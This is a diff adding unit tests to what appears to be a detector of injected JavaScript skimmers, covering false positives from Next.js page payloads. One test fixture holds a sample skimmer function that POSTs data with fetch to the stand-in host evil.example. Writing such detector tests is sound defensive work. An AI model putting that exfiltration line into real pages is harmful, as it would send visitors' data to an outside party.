@@ -120,6 +120,31 @@ class TestInjectedJsEngine:
         findings = self.engine.analyze(art)
         assert any(f.severity == Severity.CRITICAL for f in findings)
 
+    def test_rsc_payload_page_copy_is_not_malware(self):
+        # Next.js App-Router RSC/Flight payload embedding educational page COPY that
+        # mentions "exfiltration" — must NOT be flagged (it's serialized page text,
+        # not executable skimmer logic). Real FP from webhoundsecurity.com/wade.
+        script = (
+            'self.__next_f.push([1,"...suddenly starts talking to a domain you\\u2019ve '
+            'never seen. That\\u2019s often how data exfiltration begins."]])'
+        )
+        art = _artifacts(inline_scripts=[script])
+        findings = self.engine.analyze(art)
+        assert findings == [], f"data-payload page copy must not flag, got {[f.title for f in findings]}"
+
+    def test_next_data_json_island_with_keyword_is_not_malware(self):
+        # Pages-Router __NEXT_DATA__ JSON island containing the keyword in page copy.
+        script = '{"props":{"pageProps":{"body":"how to detect data exfiltration and skimmers"}}}'
+        art = _artifacts(inline_scripts=[script])
+        assert self.engine.analyze(art) == []
+
+    def test_real_executable_skimmer_keyword_still_flags(self):
+        # An ACTUAL executable script (not a data payload) with the keyword still fires.
+        script = "function exfiltrate(d){ fetch('https://evil.example/c', {method:'POST', body:d}); }"
+        art = _artifacts(inline_scripts=[script])
+        findings = self.engine.analyze(art)
+        assert any(f.severity == Severity.CRITICAL for f in findings)
+
     def test_external_script_risky_tld(self):
         art = _artifacts(external_script_urls=["https://cdn.evil.tk/script.js"])
         findings = self.engine.analyze(art)
